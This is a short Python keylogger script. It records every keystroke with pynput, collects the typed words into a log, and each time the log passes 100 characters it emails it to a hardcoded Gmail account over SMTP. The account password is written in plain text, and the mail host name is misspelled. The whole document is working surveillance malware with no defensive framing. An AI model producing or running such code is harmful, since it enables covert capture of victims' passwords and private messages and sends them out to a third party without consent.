import smtplib
import subprocess
import re
from pynput.keyboard import Key,Listener

email = 'uga@gmail.com'
pwd = '123456789'

server = smtplib.SMTP_SSL('stmp.gmail.com', 465)

server.login(email,pwd)

log  = ''
words = ''

email_char_limit = 100

def on_press(key):
    global  words

    global log
    global email
    global email_char_limit

    if key == Key.space or key  == Key.enter:
        words+=' '
        log+= words
        words = ''
        if len(log) >= email_char_limit:
            send_log()
            log = ''

    elif key == Key.shift_l or key == Key.shift_r:
        return
    elif key == Key.backspace:
        words = words[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        words+= char


def send_log():
    server.sendmail(email,email,log)

with Listener(on_press = on_press) as listener:
    listener.join()